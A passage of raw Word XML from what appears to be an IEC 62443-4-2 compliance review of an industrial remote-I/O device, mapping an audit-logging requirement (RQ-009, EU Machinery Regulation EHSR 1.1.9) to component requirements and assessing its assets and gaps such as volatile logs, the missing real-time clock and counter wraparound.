        <w:t xml:space="preserve">, and treat the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firmware-modification limb as a cross-reference to RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the self-erasing install is proven in TC-RQ008-02 — not re-tested here).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788761A9" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Retain the config-specific analytical nuances</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that are genuinely RQ-009's own: </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>actor-delegation to the PLC</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>asymmetric retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (durable REVISION_COUNTER vs volatile error-log detail), and </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>counter saturation</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBA93BE" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Boundaries: </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firmware-modification evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-008; </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5-year retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-012; </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no-signature cause</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-005; </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>update authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → RQ-011.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC2C9E6" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="4CD247D4">
          <v:rect id="_x0000_i1610" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C8495A" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B308DD" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4467FA33" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §2</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, scoped to </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">modification of installed software </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>or its configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. An </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>audit/accountability</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement whose </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unique contribution vs RQ-008 is the configuration limb</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6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963"/>
        <w:gridCol w:w="1625"/>
        <w:gridCol w:w="4244"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="5AE0E6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F6504A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7317F2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Your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6AA2CB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F3ED3B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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="43816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72120" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">CR 2.8 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Auditable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events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E8145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21A33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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>, partial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3C535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>Config-change + self-detected events generated; classification/attribution missing.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="7819C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582A9" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>CR 2.12 – Non-repudiation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260F0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DC556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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>constrained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8282B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 xml:space="preserve">For config the </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>actor</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> is knowable only at the PLC (G-1).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="66E53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D0FB1" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>CR 3.4 – Software &amp; Information Integrity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FA37D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FB000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Good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addition</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>keep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FD5AE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 xml:space="preserve">Correctly anchors the </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + I&amp;M4 change-detection (config integrity).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="01307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C1C69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 xml:space="preserve">CR 2.11 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Timestamps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AA4D7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t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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28488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Decisive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31745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>No RTC; uptime resets on cold start (SRIO-15218/15398).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="18B5F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2CB54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 xml:space="preserve">CR 2.9 / 2.10 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Capacity</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>overflow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F1EF3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t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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30F84" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6"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7207B" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">Error Log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>circular</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> ≥100; </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">REVISION_COUNTER </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>wraps</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> at 0xFFFF</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (SRIO-3002).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="7BE31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3126B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 xml:space="preserve">CR 3.9 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Protection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lastRenderedPageBreak/>
              <w:t>of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audit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information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66478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lastRenderedPageBreak/>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:lastRenderedPageBreak/>
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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92204" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:lastRenderedPageBreak/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AC5CC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>Error Log non-safety (QM), cold-start-</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>cleared (SRIO-6521).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="2867F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3BED8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lastRenderedPageBreak/>
              <w:t xml:space="preserve">CR 6.1 – Audit-log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>accessibility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D419C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t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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2AA8AE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5FF17" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">Error Log + I&amp;M </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>readable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> via IoT-Core (SRIO-10662/15221).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="370DDA4D" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Corrected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mapping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> RQ-009 → EHSR 1.1.9 §2 →</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>{CR 2.8, CR 2.9, CR 2.10, CR 2.11, CR 2.12, CR 3.4, CR 3.9, CR 6.1}</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId214" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId215" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="297C91EB" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6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947"/>
        <w:gridCol w:w="6615"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="68A58E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F6A4F6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233ADF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Your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965E1F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Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="763DC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1CF6F" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">Asset B – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6"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FA188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48778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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>The requirement-specific primary asset</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — distinguishes RQ-009 from RQ-008.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="7BCB7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17284" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Asset D – Firmware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318FB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E225A9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 xml:space="preserve">Correct — </w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>but the firmware-modification-evidence analysis is cross-referenced to RQ-008</w:t>
            </w:r>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> to avoid duplication.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00576380" w14:paraId="786F3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B3240" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Asset I – Audit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3AD60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EF37A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>Correct — stores: Error Log (volatile) + REVISION_COUNTER/I&amp;M4 (see G-3).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="4FA16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AAC86" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">Asset F – Domain </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>separation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98A97" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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268AA3" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Keep — config arrives via fieldbus from the F-Host, relayed over </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00576380">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-1983/9456); log on non-safety COM. </w:t>
            </w:r>
            <w:hyperlink r:id="rId216" w:history="1">
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId217" w:history="1">
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6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7E594EFA" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00576380" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00576380">
        <w:rPr>
          <w:b/>
          <w:bCs/>
